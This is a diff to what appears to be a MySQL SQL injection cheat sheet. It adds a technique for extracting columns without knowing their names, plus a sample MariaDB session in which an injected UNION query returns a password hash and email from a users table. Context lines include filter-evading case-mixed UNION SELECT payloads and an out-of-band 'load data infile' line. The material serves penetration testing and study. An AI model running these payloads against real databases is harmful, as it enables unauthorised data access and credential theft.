@@ -30,6 +30,26 @@ UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_sc
 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
 ```
 
+### Extract data without information_schema 
+
+Extracting data from the 4th column without knowing its name.
+
+```sql
+select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;
+```
+
+Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`
+
+````sql
+MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);
++-----------+-----------------------------------------------------------------+
+| author_id | title                                                           |
++-----------+-----------------------------------------------------------------+
+|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
++-----------+-----------------------------------------------------------------+
+```
+
+
 ## MYSQL Error Based - Basic
 
 ```sql
@@ -162,3 +182,4 @@ load data infile '\\\\error\\abc' into table database.table_name;
 ## References
 
 - [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
+- [[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
